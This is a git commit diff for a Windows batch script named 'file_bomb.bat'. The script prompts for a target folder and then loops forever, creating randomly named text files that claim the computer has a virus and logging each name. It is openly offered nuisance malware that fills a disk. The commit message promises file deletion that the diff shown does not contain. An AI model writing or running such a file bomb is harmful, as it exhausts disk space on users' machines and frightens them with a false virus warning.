2e70a9e9ee4b2b5b8cd177d8b2c983819b9e6c4e
Aayush Borkar <30978331+AbstractGhoul05@users.noreply.github.com>
2020-06-27 12:21:11 +0530

    Add support to delete files

--- file_bomb.bat
+++ file_bomb.bat
@@ -1,6 +1,9 @@
-@echo off
-md VIRUS
-cd VIRUS
+@echo on
+set /p "location=Enter the location you would like to bomb: " 
+cd %location%
+echo %location%
 :1
-echo Your Computer is affected with virus >%random%.txt 
+set /A temp = %random%
+echo Your Computer is affected with virus > %temp%.txt
+echo %temp%.txt >> temp_db.txt
 goto 1
